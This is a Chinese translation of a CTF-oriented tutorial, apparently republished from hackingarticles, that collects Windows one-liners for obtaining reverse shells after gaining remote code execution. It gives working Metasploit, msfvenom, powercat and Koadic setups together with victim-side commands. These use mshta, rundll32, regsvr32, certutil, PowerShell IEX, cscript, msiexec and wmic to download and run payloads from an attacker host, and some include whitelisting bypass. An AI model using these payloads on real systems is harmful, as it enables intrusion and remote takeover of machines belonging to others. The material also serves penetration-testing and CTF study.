**本文内容非常有助于那些参加CTF的人，因为今天我们将讨论“Windows One-Liner”，即使用PowerShell或rundll32等恶意命令来获取Windows系统的反向shell。通常，在滥用HTTP服务或其他程序时，我们会获取到RCE漏洞。
这个漏洞将允许你远程执行任意的系统命令。因此，我们准备了一个Windows命令列表，让你能够使用目标机器来获取反向连接。**

## Mshta.exe

mshta.exe是微软Windows操作系统相关程序，英文全称Microsoft HTML
Application，可翻译为微软超文本标记语言应用，用于执行.HTA文件。我们可以运行JavaScript或VBScript的HTML文件。你可以使用Microsoft
MSHTA.exe工具解析这些文件。

Metasploit包含一个生成恶意hta文件的“HTA Web
Server”模块。该模块托管HTML应用程序（HTA），打开时将通过Powershell运行payload。当用户导航到HTA文件时，在执行payload之前IE将提示两次。

    
    
    use exploit/windows/misc/hta_server
    msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
    msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
    msf exploit(windows/misc/hta_server) > exploit

现在，让我们通过受害者机器上的mshta.exe（易受RCE攻击）运行恶意代码以获取meterpreter会话。

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553473998_5c9821ceb565b.png!small)

一旦你在远程机器上成功执行了恶意hta文件，你将在本地计算机（Kali Linux）上获得一个反向连接。

    
    
    mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474018_5c9821e202ca8.png!small)

如下所示，我们成功获取到了受害者机器的meterpreter会话：

![3.png利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474031_5c9821ef7ce72.png!small)

## Rundll32.exe

Rundll32.exe与Windows系统相关联，允许你调用从DLL导出的函数（16位或32位）并将其存储在适当的内存库中。

 **通过Metasploit的SMB Delivery启动Rundll32攻击**

Metasploit还包含了生成恶意dll文件的“SMB
Delivery”模块。该模块通过SMB服务器提供payload，并提供检索和执行生成payload的命令。目前支持DLL和Powershell。

    
    
    use exploit/windows/smb/smb_delivery
    msf exploit(windows/smb/smb_delivery) > set srvhost 192.168.1.109
    msf exploit(windows/smb/smb_delivery) > exploit

现在，让我们通过受害机器上的rundll32.exe运行恶意代码（易受RCE攻击）以获取meterpreter会话。

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474056_5c982208ec8a6.png!small)

一旦你在远程机器上成功执行了dll文件，你将在本地计算机（Kali Linux）上获取到一个反向连接。

    
    
    rundll32.exe \\192.168.1.109\vabFG\test.dll,0

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474076_5c98221ce7a4f.png!small)

如下所示，我们成功获取到了受害者机器的meterpreter会话：

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474098_5c982232622a0.png!small)

## Regsvr32.exe

Regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，例如Windows注册表中的DLL和ActiveX控件。Regsvr32.exe安装在Windows
XP及更高版本Windows的％systemroot％\System32文件夹中。

RegSvr32.exe具有以下命令行选项：

    
    
    Syntax: Regsvr32 [/s][/u] [/n] [/i[:cmdline]] <dllname>

> /u - 取消注册服务器
>
> /i - 调用DllInstall传递一个可选的[cmdline]；当它与/u一起使用时，它会调用dll来卸载
>
> /n - 不要调用DllRegisterServer；此选项必须与/i一起使用
>
> /s - 静默；不显示消息框

 **通过Metasploit的Script Web Delivery启动Regsvr32**

该模块将快速启动一个为payload提供服务的Web服务器，并提供下载和执行的命令。它将通过指定的脚本语言解释器或“squiblydoo”通过regsvr32.exe，绕过应用程序白名单。此模块的主要目的是在攻击者必须手动键入命令时，在目标计算机上快速建立会话：如，命令注入。

Regsvr32使用“squiblydoo”技术绕过应用程序白名单。签名的Microsoft二进制文件Regsvr32能够请求.sct文件，然后在其中执行包含的PowerShell命令。两个Web请求（即.sct文件和PowerShell下载/执行）都可以在同一端口上发生。“PSH（Binary）”会将文件写入磁盘，允许自定义二进制文件被下载/执行。

    
    
    use exploit/multi/script/web_delivery
    msf exploit (web_delivery)>set target 3
    msf exploit (web_delivery)> set payload windows/meterpreter/reverse_tcp
    msf exploit (web_delivery)> set lhost 192.168.1.109
    msf exploit (web_delivery)>set srvhost 192.168.1.109
    msf exploit (web_delivery)>exploit

复制以下框中的文本

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474123_5c98224b95590.png!small)

一旦你在远程机器上成功执行了scrobj.dll文件，你将在本地计算机（Kali Linux）上获取到一个反向连接。

    
    
    regsvr32 /s /n /u /i://192.168.1.109:8080/xo31Jt5dIF.sct scrobj.dll

![8.png](https://image.3001.net/images/20190325/1553474145_5c9822615fad1.png!small)

如下所示，我们成功获取到了受害者机器的meterpreter会话：

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474165_5c982275b0e06.png!small)

## Certutil.exe

Certutil.exe是一个命令行程序，作为证书服务的一部分安装。
我们可以使用它在目标计算机上执行我们的恶意exe文件，以获取meterpreter会话。

 **通过Msfvenom启动certutil攻击**

使用msfvenom生成恶意可执行（.exe）文件，并启动multi/handler以获取受害者计算机的反向shell。

    
    
    msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f exe > shell.exe

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474188_5c98228ca3614.png!small)

现在，使用certutil转储配置信息或shell.exe文件。你可以遵循以下语法：

    
    
    Syntax: [-f] [-urlcache] [-split] Path of executable file
    
    
    certutil.exe -urlcache -split -f //192.168.1.109/shell.exe shell.exe & shell.exe

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474208_5c9822a0c2a5e.png!small)

    
    
    use exploit/multi/handler  
    msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp  
    msf exploit(multi/handler) > set lhost 192.168.1.109  
    msf exploit(multi/handler) > set lport 1234  
    msf exploit(multi/handler) > exploit

如下所示，我们成功获取到了受害者机器的meterpreter会话：

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474236_5c9822bc39f2a.png!small)

## Powershell.exe

你可以使用PowerShell.exe，或从其他工具（如Cmd.exe）启动PowerShell会话，或是在PowerShell命令行中使用它来启动新会话。有关详情你可以阅读Microsoft
windows[官网](https://docs.microsoft.com/en-us/powershell/scripting/components/console/powershell.exe-command-line-help?view=powershell-6)上的内容。

 **通过Powershell启动Powercat攻击**

Powercat是一个PowerShell native backdoor listener和reverse
shell，被称之为netcat的修改版，因为它集成了payload编码，msfvenom会这么做，并且还有一个客户端到客户端中继，允许连接两个独立的侦听器。

在本地计算机上下载PowerShell，然后使用python HTTP
server传输powercat.ps1以获取目标机器的反向shell，并启动netcat侦听器。

    
    
    git clone //github.com/besimorhino/powercat.git
    python -m SimpleHTTPServer 80

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474265_5c9822d982952.png!small)

然后，在远程端执行以下命令获取netcat会话。

    
    
    powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('//192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd"

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474292_5c9822f489652.png!small)

如下所示，我们获取到了受害者机器的netcat会话：

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474310_5c98230602c6e.png!small)

##  **Batch File**

同样，PowerShell允许客户端执行bat文件，因此让我们使用msfvenom生成恶意批处理文件，并启动netcat监听器。如下所示：

    
    
    msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=4444 > 1.bat

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474335_5c98231f71d8b.png!small)

然后，在远程端执行以下命令获取netcat会话。

    
    
    powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('//192.168.1.109/1.bat'))

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474372_5c9823449f124.png!small)

如下所示，我们获取到了受害者机器的netcat会话：

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474390_5c98235626e14.png!small)

##  **Cscript**

同样，PowerShell允许客户端执行cscript.exe来运行wsf，js和vbscript，因此让我们使用msfvenom生成恶意bat文件，并启动multi/handler作为侦听程序。如下所示：

    
    
    msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=1234 -f vbs > 1.vbs

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474412_5c98236cc9388.png!small)

然后，在远程端执行以下命令获取meterpreter会话。

    
    
    powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('//192.168.1.109/1.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474434_5c982382d86b4.png!small)

    
    
    use exploit/multi/handler
    msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
    msf exploit(multi/handler) > set lhost 192.168.1.109
    msf exploit(multi/handler) > set lport 1234
    msf exploit(multi/handler) > exploit

如下所示，我们成功获取到了受害者机器的meterpreter会话：

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474464_5c9823a0cbb2c.png!small)

## Msiexec.exe

我们知道Windows操作系统安装了Windows Installer引擎，MSI
Package使用该引擎来安装应用程序。解释包和安装产品的可执行程序是Msiexec.exe。

 **通过msfvenom启动msiexec攻击**

让我们使用Windows Meterpreter payload生成一个MSI
Package文件（1.msi），并启动multi/handler作为侦听程序。如下所示：

    
    
    msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f msi > 1.msi

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474492_5c9823bc9885c.png!small)

一旦你在远程机器上成功执行了1.msi文件，你将在本地计算机（Kali Linux）上获取到一个反向连接。

    
    
    msiexec /q /i //192.168.1.109/1.msi

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474514_5c9823d238e7c.png!small)

    
    
    use exploit/multi/handler
    msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
    msf exploit(multi/handler) > set lhost 192.168.1.109
    msf exploit(multi/handler) > set lport 1234
    msf exploit(multi/handler) > exploit

如下所示，我们成功获取到了受害者机器的meterpreter会话：

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474538_5c9823ea087de.png!small)

## Wmic.exe

wmic.exe是WMI 命令行，作为Windows XP的一部分发布的WMI命令行工具 (wmic.exe)
提供一个到WMI基础结构的命令行接口。可以使用wmic.exe执行来自命令行的常见WMI任务，包括浏览CIM和检CIM类定义。

 **通过Koadic启动Wmic.exe攻击**

现在，将在koadic的帮助下生成恶意XSL文件，这是一个命令和控制工具，与Metasploit和Powershell
Empire非常相似。有关详情请参阅：<https://www.hackingarticles.in/koadic-com-command-control-framework/>

安装完成后，你可以运行./koadic文件来启动koadic，并加载stager/js/wmic
stager。运行以下命令并设置SRVHOST，其中stager应调用home。

    
    
    use stager/js/wmic
    set SRVHOST 192.168.1.107
    run

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474567_5c9824073de63.png!small)

执行WMIC的以下命令从远程服务器下载并运行恶意XSL文件：

    
    
    wmic os get /FORMAT:"//192.168.1.107:9996/g8gkv.xsl"

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474588_5c98241ca3975.png!small)

一旦恶意XSL文件在目标机器上成功执行，就会获取到一个Zombie连接。

![利用Windows one-liner获取反向Shell](https://image.3001.net/images/20190325/1553474610_5c9824327deda.png!small)

 ***参考来源：[hackingarticles](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)，FB小编secist编译，转载请注明来自FreeBuf.COM **  

